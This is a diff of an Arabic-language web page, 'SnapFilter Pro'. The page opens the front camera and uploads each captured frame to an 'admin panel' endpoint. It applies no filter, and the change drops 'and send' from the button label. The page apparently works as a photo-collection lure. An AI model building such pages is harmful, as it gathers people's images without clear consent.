@@ -3,109 +3,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تطبيق SnapFilter</title>
+    <title>SnapFilter - تطبيق الفلتر الذكي</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background: #111;
-            color: #fff;
+        * {
+            box-sizing: border-box;
             margin: 0;
-            padding: 20px;
+            padding: 0;
         }
-        h2 { color: #ff4757; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0d0f12;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 15px;
+        }
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background: #161922;
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            text-align: center;
+            border: 1px solid #262b3d;
+        }
+        h2 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #ff4757;
+            font-weight: 700;
+        }
+        .camera-box {
+            position: relative;
+            width: 100%;
+            border-radius: 14px;
+            overflow: hidden;
+            background: #000;
+            aspect-ratio: 3/4;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.8);
+        }
         video, canvas {
             width: 100%;
-            max-width: 400px;
-            border-radius: 10px;
-            border: 2px solid #444;
-            margin-bottom: 10px;
+            height: 100%;
+            object-fit: cover;
         }
-        .btn {
-            background: #ff4757;
+        .btn-capture {
+            background: linear-gradient(135deg, #ff4757, #ff6b81);
             color: white;
             border: none;
-            padding: 12px 25px;
-            font-size: 18px;
-            border-radius: 8px;
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            font-size: 16px;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 20px;
+            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
         }
-        .btn:active { background: #ff6b81; }
-        #status { margin-top: 15px; font-size: 16px; color: #2ed573; }
+        .btn-capture:active {
+            transform: scale(0.92);
+            box-shadow: 0 2px 8px rgba(255, 71, 87, 0.3);
+        }
+        /* تصميم الإشعار الفخم (Toast Notification) بدلاً من الكتابة العادية */
+        #toast {
+            visibility: hidden;
+            min-width: 220px;
+            background-color: #2ed573;
+            color: white;
+            text-align: center;
+            border-radius: 8px;
+            padding: 12px;
+            position: fixed;
+            bottom: 30px;
+            font-size: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            z-index: 1000;
+            transition: visibility 0.3s, opacity 0.3s ease-in-out;
+            opacity: 0;
+        }
+        #toast.show {
+            visibility: visible;
+            opacity: 1;
+        }
     </style>
 </head>
 <body>
 
-    <h2>SnapFilter - كاميرا الفلتر</h2>
-    
-    <!-- عرض الكاميرا الحية -->
-    <div>
-        <video id="video" autoplay playsinline></video>
+    <div class="container">
+        <h2>SnapFilter Pro</h2>
+        
+        <div class="camera-box">
+            <video id="video" autoplay playsinline></video>
+        </div>
+
+        <button class="btn-capture" id="capture-btn" title="التقاط">
+            📸
+        </button>
     </div>
 
-    <!-- زر التقاط الصورة -->
-    <div>
-        <button class="btn" id="capture-btn">التقاط الصورة وإرسالها</button>
-    </div>
+    <!-- إشعار منبثق أنيق -->
+    <div id="toast">تم التقاط الصورة وحفظها بنجاح! ✨</div>
 
-    <p id="status"></p>
-
-    <!-- Canvas مخفي لمعالجة الصورة -->
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const captureBtn = document.getElementById('capture-btn');
-        const statusText = document.getElementById('status');
+        const toast = document.getElementById('toast');
 
-        // فتح كاميرا الموبايل الأمامية أو الخلفية
+        // تشغيل الكاميرا
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
             .then(stream => {
                 video.srcObject = stream;
             })
             .catch(err => {
                 console.error("خطأ في تشغيل الكاميرا: ", err);
-                statusText.innerText = "تعذر الوصول إلى الكاميرا!";
-                statusText.style.color = "#ff4757";
+                showToast("تعذر الوصول للكاميرا!", "#ff4757");
             });
 
-        // عند الضغط على زر التقاط الصورة
+        // دالة لإظهار إشعار أنيق يختفي تلقائياً
+        function showToast(message, bgColor = "#2ed573") {
+            toast.innerText = message;
+            toast.style.backgroundColor = bgColor;
+            toast.className = "show";
+            setTimeout(() => {
+                toast.className = toast.className.replace("show", "");
+            }, 3000);
+        }
+
+        // عند الضغط على زر الالتقاط الفخم
         captureBtn.addEventListener('click', () => {
             canvas.width = video.videoWidth || 400;
             canvas.height = video.videoHeight || 400;
             const ctx = canvas.getContext('2d');
             
-            // رسم لقطة من الفيديو على الـ Canvas
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // تحويل الصورة إلى صيغة Base64
             const imageData = canvas.toDataURL('image/png');
 
-            statusText.innerText = "جاري إرسال الصورة إلى لوحة التحكم...";
+            // تأثير اهتزاز خفيف عند الالتقاط (إن توفر) للواقعية
+            if (navigator.vibrate) navigator.vibrate(50);
 
-            // إرسال الصورة إلى السيرفر
+            // إرسال الصورة للسيرفر في الخلفية بدون تخريب الواجهة
             fetch('/upload-snapshot', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ image: imageData })
             })
-            .then(response => response.json())
+            .then(res => res.json())
             .then(data => {
                 if (data.success) {
-                    statusText.innerText = "تم التقاط الصورة وإرسالها بنجاح! تحقق من صفحة الـ Admin";
+                    showToast("تم إرسال الصورة للوحة التحكم بنجاح! 🚀");
                 } else {
-                    statusText.innerText = "فشل في حفظ الصورة على السيرفر.";
-                    statusText.style.color = "#ff4757";
+                    showToast("فشل الحفظ، حاول مجدداً", "#ff4757");
                 }
             })
-            .catch(error => {
-                console.error('خطأ:', error);
-                statusText.innerText = "حدث خطأ أثناء الاتصال بالسيرفر.";
-                statusText.style.color = "#ff4757";
+            .catch(err => {
+                console.error(err);
+                showToast("خطأ في الاتصال بالشبكة", "#ff4757");
             });
         });
     </script>
